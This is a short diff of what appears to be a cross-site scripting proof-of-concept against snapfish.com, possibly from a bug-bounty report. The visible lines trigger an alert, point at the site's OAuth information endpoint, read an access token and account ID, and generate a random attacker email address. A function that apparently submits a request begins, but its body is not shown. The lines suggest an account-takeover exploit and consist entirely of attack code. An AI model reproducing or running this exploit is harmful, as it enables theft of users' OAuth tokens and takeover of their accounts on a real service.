@@ -2,7 +2,7 @@ alert(document.domain);
 
 url = "https://www.snapfish.com/library/getOauthInfo"
 access_token = "text.oauthInfo.oa2";
-account_id = "text.oauthInfo.oa2";
+account_id = "text.oauthInfo.accountId";
 attacker_email = "attacker" + (Math.random() + 1).toString(36).substring(7) + "@khara.one";
 
 function submitRequest()
